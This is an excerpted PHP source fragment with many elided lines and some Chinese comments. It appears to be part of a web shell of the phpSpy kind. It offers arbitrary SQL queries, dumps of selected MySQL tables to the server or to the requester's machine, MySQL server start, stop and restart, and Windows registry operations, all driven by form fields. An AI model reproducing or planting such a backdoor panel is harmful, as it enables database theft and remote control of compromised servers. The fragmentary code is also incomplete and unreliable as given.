...
// 直接下载备份数据库
if (@$_POST['backuptype'] == 'download1') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("connect failed");
...
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">Registry operation</a>" : "";
...
$tb->tdbody('<a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href=mysqld.php?action=start>Startserver</a> |<a href=mysqld.php?action=stop>Stoptserver</a> |<a href=mysqld.php?action=restart>Restartserver</a>');
$tb->tablefooter();
?>
...
elseif (@$_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("failed1");
	@mysql_select_db($dbname) or die("failed2");
...
elseif (@$_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "please select backup table!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("connect failed!");
			@mysql_select_db($dbname) or die("select failed1");	
			$table = array_flip($_POST['table']);
			...
			if ($filehandle) {
				...
				fclose($filehandle);
				echo "database backup success <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "failed,请确认目标文件夹是否具有可写权限!";
			}
		}
	}
}
...
if (@$_GET['action'] == "sql") {
	...
	$tb->tableheader();
	$tb->formheader($action,'action SQL ');
...
elseif (@$_GET['action'] == "sqlbak") {
	...
	$dbname = @$_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,'backup MySQL database');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','connect','','submit'));
	...
	if (empty($cachetables)) {
		$tb->tdbody('<b>You are not connected to the database or There are no tables in the current database</b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">please select table:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> the path you backup:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> Download directly to local </td></tr></table>');
